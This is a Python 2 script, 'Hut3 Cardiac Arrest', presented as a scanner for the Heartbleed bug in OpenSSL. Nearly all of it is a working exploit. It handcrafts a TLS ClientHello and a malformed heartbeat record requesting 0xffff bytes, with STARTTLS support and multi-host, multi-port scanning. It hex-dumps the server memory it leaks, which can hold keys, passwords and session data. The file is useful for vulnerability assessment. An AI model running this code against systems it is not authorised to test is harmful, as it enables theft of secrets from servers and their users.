#!/usr/bin/python

# Hut3 Cardiac Arrest - A script to check OpenSSL servers for the Heartbleed bug (CVE-2014-0160).
# 
# This script has several advantages over similar scripts that have been released,
# including a larger list of supported TLS cipher suites, support for multiple TLS
# protocol versions (including SSLv3 since some configurations leak memory when
# SSLv3 is used). Multiple ports / hosts can be tested at once, and limited
# STARTTLS support is included.
#
#
# Examples:
# 
# Test all SSL/TLS protocols against 192.168.0.1 and 192.168.0.2 on ports 443 and 8443:
#
#    python heartattack.py -p 443,8443 192.168.0.1 192.168.0.2
#
# Test the TLSv1.2 protocol against 192.168.0.1 using SMTP STARTTLS on port 25:
#
#    python heartattack.py -s smtp -p 25 -V TLSv1.2 192.168.0.1
#
#
# Several sections of code have been lifted from other detection scripts and
# modified to make them more efficient.
#
# Like other authors of Heartbleed scripts, I disclaim copyright to this source code.

import sys
import struct
import socket
import time
import select
import re
import argparse
import random
import string

bytes = 16
display_null_bytes = False
verbose = False

STARTTLS = ['none', 'smtp', 'pop3', 'imap', 'ftp']

VERSIONS = {'sslv3':0, 'ssl3':0, 'tlsv1.0':1, 'tls1.0':1, 'tlsv1.1':2, 'tls1.1':2, 'tlsv1.2':3, 'tls1.2':3}

alertLevel = {1:'warning', 2:'fatal'}
alertDescription = {0:'Close notify', 10:'Unexpected message', 20:'Bad record MAC', 21:'Decryption failed', 22:'Record overflow ', 30:'Decompression failure', 40:'Handshake failure', 41:'No certificate', 42:'Bad certificate', 43:'Unsupported certificate', 44:'Certificate revoked', 45:'Certificate expired', 46:'Certificate unknown', 47:'Illegal parameter', 48:'Unknown CA', 49:'Access denied', 50:'Decode error', 51:'Decrypt error', 60:'Export restriction', 70:'Protocol version', 71:'Insufficient security', 80:'Internal error', 90:'User canceled', 100:'No renegotiation', 110:'Unsupported extension', 111:'Certificate unobtainable', 112:'Unrecognized name', 113:'Bad certificate status response', 114:'Bad certificate hash value', 115:'Unknown PSK identity'}

BUFFERSIZE = 1024

def rand(size=10, chars=string.letters + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def hexdump(s):
    global bytes, display_null_bytes
    s = str(s)
    for b in xrange(0, len(s), bytes):
        lin = [c for c in s[b : b + bytes]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        if pdat:
            if not display_null_bytes:
                if not re.match('^\.{' + str(bytes) + '}$', pdat):
                    print '  %04x: %-48s %s' % (b, hxdat, pdat)
            else:
                print '  %04x: %-48s %s' % (b, hxdat, pdat)
    sys.stdout.flush()

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

def gen_clienthello(v):
    return h2bin('16 03 0' + str(v) + ' 02 ae 01 00 02 aa 03 0' + str(v) + ' 53 48 73 f0 7c ca c1 d9 02 04 f2 1d 2d 49 f5 12 bf 40 1b 94 d9 93 e4 c4 f4 f0 d0 42 cd 44 a2 59 00 02 7c 00 00 00 01 00 02 00 03 00 04 00 05 00 06 00 07 00 08 00 09 00 0a 00 0b 00 0c 00 0d 00 0e 00 0f 00 10 00 11 00 12 00 13 00 14 00 15 00 16 00 17 00 18 00 19 00 1a 00 1b 00 1e 00 1f 00 20 00 21 00 22 00 23 00 24 00 25 00 26 00 27 00 28 00 29 00 2a 00 2b 00 2c 00 2d 00 2e 00 2f 00 30 00 31 00 32 00 33 00 34 00 35 00 36 00 37 00 38 00 39 00 3a 00 3b 00 3c 00 3d 00 3e 00 3f 00 40 00 41 00 42 00 43 00 44 00 45 00 46 00 67 00 68 00 69 00 6a 00 6b 00 6c 00 6d 00 84 00 85 00 86 00 87 00 88 00 89 00 8a 00 8b 00 8c 00 8d 00 8e 00 8f 00 90 00 91 00 92 00 93 00 94 00 95 00 96 00 97 00 98 00 99 00 9a 00 9b 00 9c 00 9d 00 9e 00 9f 00 a0 00 a1 00 a2 00 a3 00 a4 00 a5 00 a6 00 a7 00 a8 00 a9 00 aa 00 ab 00 ac 00 ad 00 ae 00 af 00 b0 00 b1 00 b2 00 b3 00 b4 00 b5 00 b6 00 b7 00 b8 00 b9 00 ba 00 bb 00 bc 00 bd 00 be 00 bf 00 c0 00 c1 00 c2 00 c3 00 c4 00 c5 00 ff c0 01 c0 02 c0 03 c0 04 c0 05 c0 06 c0 07 c0 08 c0 09 c0 0a c0 0b c0 0c c0 0d c0 0e c0 0f c0 10 c0 11 c0 12 c0 13 c0 14 c0 15 c0 16 c0 17 c0 18 c0 19 c0 1a c0 1b c0 1c c0 1d c0 1e c0 1f c0 20 c0 21 c0 22 c0 23 c0 24 c0 25 c0 26 c0 27 c0 28 c0 29 c0 2a c0 2b c0 2c c0 2d c0 2e c0 2f c0 30 c0 31 c0 32 c0 33 c0 34 c0 35 c0 36 c0 37 c0 38 c0 39 c0 3a c0 3b c0 3c c0 3d c0 3e c0 3f c0 40 c0 41 c0 42 c0 43 c0 44 c0 45 c0 46 c0 47 c0 48 c0 49 c0 4a c0 4b c0 4c c0 4d c0 4e c0 4f c0 50 c0 51 c0 52 c0 53 c0 54 c0 55 c0 56 c0 57 c0 58 c0 59 c0 5a c0 5b c0 5c c0 5d c0 5e c0 5f c0 60 c0 61 c0 62 c0 63 c0 64 c0 65 c0 66 c0 67 c0 68 c0 69 c0 6a c0 6b c0 6c c0 6d c0 6e c0 6f c0 70 c0 71 c0 72 c0 73 c0 74 c0 75 c0 76 c0 77 c0 78 c0 79 c0 7a c0 7b c0 7c c0 7d c0 7e c0 7f c0 80 c0 81 c0 82 c0 83 c0 84 c0 85 c0 86 c0 87 c0 88 c0 89 c0 8a c0 8b c0 8c c0 8d c0 8e c0 8f c0 90 c0 91 c0 92 c0 93 c0 94 c0 95 c0 96 c0 97 c0 98 c0 99 c0 9a c0 9b c0 9c c0 9d c0 9e c0 9f c0 a0 c0 a1 c0 a2 c0 a3 c0 a4 c0 a5 c0 a6 c0 a7 c0 a8 c0 a9 c0 aa c0 ab c0 ac c0 ad c0 ae c0 af 01 00 00 05 00 0f 00 01 01')

def gen_heartbeat(v):
    return h2bin('18 03 0' + str(v) + ' 00 03 01 ff ff')

def recvall(s, length, timeout=5):
    end = time.time() + timeout
    rdata = ''
    while length > 0:
        ready = select.select([s], [], [], 1)
        if ready[0]:
            data = s.recv(length)
            if not data:
                break
            leng = len(data)
            rdata += data
            if time.time() > end:
                break
            length -= leng
        else:
            if time.time() > end:
                break
    return rdata

def recvmsg(s, timeout=5):
    hdr = recvall(s, 5, timeout)
    if hdr is None:
        return None, None, None
    elif len(hdr) == 5:
        type, version, length = struct.unpack('>BHH', hdr)
        payload = recvall(s, length, timeout)
        if payload is None:
            return type, version, None
    else:
        return None, None, None
    return type, version, payload

def attack(ip, port, tlsversion, starttls='none', timeout=5):
    if tlsversion == 3:
        tlslongver = 'TLSv1.2'
    elif tlsversion == 2:
        tlslongver = 'TLSv1.1'
    elif tlsversion == 0:
        tlslongver = 'SSLv3.0'
    else:
        tlsversion = 1
        tlslongver = 'TLSv1.0'
        
    withstarttls = ''
    if starttls != 'none':
        withstarttls = ' with STARTTLS'
        
    print '[INFO] Connecting to ' + str(ip) + ':' + str(port) + ' using ' + tlslongver + withstarttls
    sys.stdout.flush()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    
    try:
        s.connect((ip, port))
        
        if starttls == 'smtp':
            recvall(s, BUFFERSIZE)
            s.send('ehlo ' + rand(10) + '\n')
            res = recvall(s, BUFFERSIZE)
            if not 'STARTTLS' in res:
                print >> sys.stderr, '\033[93m[ERROR] STARTTLS does not appear to be supported.\033[0m\n'
                sys.stderr.flush()
                return False
            s.send('starttls\n')
            recvall(s, BUFFERSIZE)
        elif starttls == 'pop3':
            recvall(s, BUFFERSIZE)
            s.send("STLS\n")
            recvall(s, BUFFERSIZE)
        elif starttls == 'imap':
            recvall(s, BUFFERSIZE)
            s.send("STARTTLS\n")
            recvall(s, BUFFERSIZE)
        elif starttls == 'ftp':
            recvall(s, BUFFERSIZE)
            s.send("AUTH TLS\n")
            recvall(s, BUFFERSIZE)
                    
        s.send(gen_clienthello(tlsversion))
        
        while True:
            type, version, payload = recvmsg(s, timeout)
            if type is None:
                print >> sys.stderr, '\033[93m[ERROR] The server closed the connection without sending the ServerHello. This might mean the server does not support ' + tlslongver + ' or it might not support SSL/TLS at all.\033[0m\n'
                sys.stderr.flush()
                return False
            elif type == 22 and ord(payload[0]) == 0x0E:
                break
        
        s.send(gen_heartbeat(tlsversion))
        
        while True:
            type, version, payload = recvmsg(s, timeout)
            if type is None:
                print '[INFO] No heartbeat response was received. The server is probably not vulnerable.\n'
                sys.stdout.flush()
                return False
    
            if type == 24:
                if len(payload) > 3:
                    print '\033[91m\033[1m[FAIL] Heartbeat response was ' + str(len(payload)) + ' bytes instead of 3! ' + str(ip) + ':' + str(port) + ' is vulnerable over ' + tlslongver + '\033[0m'
                    if display_null_bytes:
                        print '[INFO] Displaying response:'
                    else:
                        print '[INFO] Displaying response (lines consisting entirely of null bytes are removed):'
                    print ''
                    sys.stdout.flush()
                    hexdump(payload)
                    print ''
                    return True
                else:
                    print '[INFO] The server processed the malformed heartbeat, but did not return any extra data.\n'
                    sys.stdout.flush()
                    return False
    
            if type == 21:
                print '[INFO] The server received an alert. It is likely not vulnerable.'
                if verbose: print '[INFO] Alert Level: ' + alertLevel[int(payload[0].encode('hex'), 16)]
                if verbose: print '[INFO] Alert Description: ' + alertDescription[int(payload[1].encode('hex'), 16)] + ' (see RFC 5246 section 7.2)'
                print ''
                sys.stdout.flush()
                return False
    
        hexdump(payload)
        
        socket.close()
    except socket.error as e:
        print >> sys.stderr, '\033[93m[ERROR] Connection error. The port might not be open on the host.\033[0m\n'
        sys.stderr.flush()
        return False

def main():
    global bytes, display_null_bytes, verbose
    
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--ports', type=str, default='443', help='Comma separated list of ports to check (default: 443)')
    parser.add_argument('-s', '--starttls', type=str, default='none', help='Use STARTTLS to upgrade the plaintext connection to SSL/TLS. Valid values: none, smtp, pop3, imap, ftp (default: none)')
    parser.add_argument('-t', '--timeout', type=int, default=5, help='Connection timeout in seconds (default: 5)')
    parser.add_argument('-b', '--bytes', type=int, default=16, help='Number of leaked bytes to display per line (default 16)')
    parser.add_argument('-n', '--null-bytes', action='store_true', default=False, help='Display lines consisting entirely of null bytes (default: False)')
    parser.add_argument('-a', '--all-versions', action='store_true', default=False, help='Continue testing all versions of SSL/TLS even if the server is found to be vulnerable (default: False)')
    parser.add_argument('-V', '--version', type=str, default='all', help='Comma separated list of SSL/TLS versions to check. Valid values: SSLv3, TLSv1.0, TLSv1.1, TLSv1.2')
    parser.add_argument('-v', '--verbose', action='store_true', default=False, help='Verbose output.')
    parser.add_argument('hosts', metavar='host', nargs='+', help='A host to scan.')
    args = parser.parse_args()
    
    args.starttls = args.starttls.lower()
    if args.starttls not in STARTTLS:
        print >> sys.stderr, '\033[93m[ERROR] Invalid STARTTLS value. Valid values: none, smtp, pop3, imap, ftp.\033[0m\n'
        parser.print_help()
        sys.exit(1)
    
    bytes = args.bytes
    display_null_bytes = args.null_bytes
    verbose = args.verbose
    
    versions = []
    for v in [x.lower() for x in args.version.split(',')]:
        v = v.strip()
        if v:
            versions.append(v)
    
    if 'all' not in versions:
        for v in versions:
            if v not in VERSIONS:
                print >> sys.stderr, '\033[93m[ERROR] Invalid SSL/TLS version(s). Valid values: SSLv3, TLSv1.0, TLSv1.1, TLSv1.2.\033[0m\n'
                parser.print_help()
                sys.exit(1)
    
    ports = args.ports.split(',')
    ports = list(map(int, ports))
    
    hosts = []
    
    for h in args.hosts:
        for h2 in h.split(','):
            h2 = h2.strip()
            if h2:
                hosts.append(h2)
    
    for host in hosts:
        try:
            ip = socket.gethostbyname(host)
        except socket.gaierror as e:
            print '[INFO] Testing: ' + host
            print >> sys.stderr, '\033[93m[ERROR] Could not resolve an IP address for the given host.\033[0m\n'
            sys.stderr.flush()
            continue
            
        if ip == host:
            print '[INFO] Testing: ' + host + '\n'
        else:
            print '[INFO] Testing: ' + host + ' (' + str(ip) + ')\n'
        sys.stdout.flush()
        
        for port in ports:
            if 'all' in versions:
                if (args.all_versions):
                    ssl30 = attack(ip, port, 0, starttls=args.starttls, timeout=args.timeout)
                    tls10 = attack(ip, port, 1, starttls=args.starttls, timeout=args.timeout)
                    tls11 = attack(ip, port, 2, starttls=args.starttls, timeout=args.timeout)
                    tls12 = attack(ip, port, 3, starttls=args.starttls, timeout=args.timeout)
                    
                    if not ssl30 and not tls10 and not tls11 and not tls12:
                        if ip == host:
                            print '\033[1m[PASS] ' + host + ':' + str(port) + ' does not appear to be vulnerable to Heartbleed!\033[0m\n'
                        else:
                            print '\033[1m[PASS] ' + host + ':' + str(port) + ' (' + str(ip) + ':' + str(port) +') does not appear to be vulnerable to Heartbleed!\033[0m\n'
                        sys.stdout.flush()
                else:
                    if not attack(ip, port, 0, starttls=args.starttls, timeout=args.timeout):
                        if not attack(ip, port, 1, starttls=args.starttls, timeout=args.timeout):
                            if not attack(ip, port, 2, starttls=args.starttls, timeout=args.timeout):
                                if not attack(ip, port, 3, starttls=args.starttls, timeout=args.timeout):
                                    if ip == host:
                                        print '\033[1m[PASS] ' + host + ':' + str(port) + ' does not appear to be vulnerable to Heartbleed!\033[0m\n'
                                    else:
                                        print '\033[1m[PASS] ' + host + ':' + str(port) + ' (' + str(ip) + ':' + str(port) + ') does not appear to be vulnerable to Heartbleed!\033[0m\n'
                                    sys.stdout.flush()
            else:
                if (args.all_versions):
                    vulnerable = []
                    for v in versions:
                        if attack(ip, port, VERSIONS[v], starttls=args.starttls, timeout=args.timeout):
                            vulnerable.append(True)
                    if True not in vulnerable:
                        if ip == host:
                            print '\033[1m[PASS] ' + host + ':' + str(port) + ' does not appear to be vulnerable to Heartbleed!\033[0m\n'
                        else:
                            print '\033[1m[PASS] ' + host + ':' + str(port) + ' (' + str(ip) + ':' + str(port) + ') does not appear to be vulnerable to Heartbleed!\033[0m\n'
                        sys.stdout.flush()
                else:
                    vulnerable = True
                    for v in versions:
                        vulnerable = attack(ip, port, VERSIONS[v], starttls=args.starttls, timeout=args.timeout)
                        if vulnerable:
                            break
                        else:
                            continue
                    if not vulnerable:
                        if ip == host:
                            print '\033[1m[PASS] ' + host + ':' + str(port) + ' does not appear to be vulnerable to Heartbleed!\033[0m\n'
                        else:
                            print '\033[1m[PASS] ' + host + ':' + str(port) + ' (' + str(ip) + ':' + str(port) + ') does not appear to be vulnerable to Heartbleed!\033[0m\n'
                        sys.stdout.flush()
                    
                            

if __name__ == '__main__':
    main()